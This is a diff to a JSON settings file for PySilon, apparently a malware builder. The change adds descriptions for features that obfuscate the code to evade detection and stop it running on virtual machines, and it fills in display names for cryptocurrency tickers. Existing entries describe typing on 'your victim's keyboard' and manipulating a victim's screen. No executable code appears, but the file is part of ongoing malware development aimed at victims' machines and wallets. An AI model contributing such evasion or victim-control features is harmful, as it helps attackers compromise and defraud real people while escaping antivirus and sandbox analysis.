@@ -29,6 +29,8 @@
         "jmpscar": "Kinda nothing to add here.", 
         "keystrk": "Type words using your victim's keyboard.", 
         "scrnman": "Manipulate computer's graphics and display basically anything.",
+        "obfuscation": "Obfuscate PySilon's code to make it harder to detect.",
+        "anti_vm": "Prevent PySilon from running on VMs (double-click for advanced settings).",
         "advanced_antivm": {
             "FilesCheck": "Check for VM-typical system files.",
             "ProcessesCheck": "Check for VM-typical processes.",
@@ -41,11 +43,11 @@
             "DOGE": "DogeCoin",
             "LTC": "LiteCoin",
             "XMR": "Monero",
-            "BCH": "",
-            "DASH": "",
-            "TRX": "",
-            "XRP": "",
-            "XLM": ""
+            "BCH": "BitCoin Cash",
+            "DASH": "Digital Cash",
+            "TRX": "Tron",
+            "XRP": "Ripple",
+            "XLM": "Stellar"
         }
     }
 }
